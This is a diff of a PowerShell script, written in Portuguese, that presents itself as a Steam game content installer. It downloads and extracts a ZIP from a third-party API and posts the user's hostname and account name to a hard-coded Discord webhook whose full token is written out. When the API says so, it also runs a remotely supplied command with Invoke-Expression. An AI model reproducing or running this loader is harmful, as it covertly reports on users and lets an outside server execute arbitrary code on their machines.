@@ -1,22 +1,22 @@
-# 1. Configurações Iniciais (Sintaxe PowerShell)
+# Configurações Iniciais
 $API_URL = "https://gaamingsteam.squareweb.app/api/app/"
 $APP_ID = "kastexstorms"
 $ID_JOGO = "2215200"
-$WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"
+$WEBHOOK_URL = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0" 
 
 $HOSTNAME_PC = hostname
 $USUARIO = whoami
 $DATA = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
-$STATUS = "✅ Sucesso"
+$STATUS = "✅ Sucesso" 
 
-# Função de Mensagem
+# Funções de Mensagem
 function Show-MessageBox {
     param([string]$Message, [string]$Title)
     Add-Type -AssemblyName PresentationFramework
     [System.Windows.MessageBox]::Show($Message, $Title)
 }
 
-# 2. Buscar Configurações da API
+# 1. Buscar Configurações da API
 $UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
 try {
     $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
@@ -30,22 +30,22 @@ if (-not $response.ativo) {
     exit
 }
 
-# 3. Detectar e Criar Pastas
+# 2. Detectar Caminhos
 $DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
 if (-not (Test-Path $DocumentsPath)) {
     New-Item -ItemType Directory -Path $DocumentsPath | Out-Null
 }
 
-# 4. Baixar o arquivo ZIP
+# 3. Baixar o arquivo ZIP
 $ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
 try {
     Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino
 } catch {
-    $STATUS = "❌ Falhou no Download"
     Write-Error "Falha ao baixar o arquivo ZIP."
+    exit
 }
 
-# 5. Processar e Extrair o ZIP
+# 4. Processar e Extrair o ZIP
 $reiniciar = $false
 if (Test-Path $ZipDestino) {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -72,27 +72,24 @@ if (Test-Path $ZipDestino) {
     Remove-Item $ZipDestino -Force
 }
 
-# 6. Enviar Relatório para o Discord (Substituindo CURL e CAT)
+# 5. Enviar para o Discord (Substituindo CURL e PAYLOAD Bash)
 $Payload = @{
     embeds = @(@{
         title = "📊 Relatório de Execução"
         color = 3066993
         fields = @(
-            @{ name = "🎮 ID do Jogo"; value = $ID_JOGO; inline = $true }
-            @{ name = "💻 PC"; value = $HOSTNAME_PC; inline = $true }
-            @{ name = "👤 Usuário"; value = $USUARIO; inline = $true }
-            @{ name = "📅 Data/Hora"; value = $DATA; inline = $true }
+            @{ name = "🎮 ID do Jogo"; value = $ID_JOGO; inline = $true },
+            @{ name = "💻 PC"; value = $HOSTNAME_PC; inline = $true },
+            @{ name = "👤 Usuário"; value = $USUARIO; inline = $true },
+            @{ name = "📅 Data/Hora"; value = $DATA; inline = $true },
             @{ name = "Status"; value = $STATUS; inline = $false }
         )
     })
 }
 
-$Json = $Payload | ConvertTo-Json -Depth 4
-try {
-    Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $Json -ContentType "application/json"
-} catch {}
+Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body ($Payload | ConvertTo-Json -Depth 4) -ContentType "application/json"
 
-# 7. Executar Comando Steam Update e Finalizar
+# 6. Executar Comando Steam Update e Finalizar
 if ($reiniciar -and $response.comando_powershell) {
     Invoke-Expression $response.comando_powershell
 }
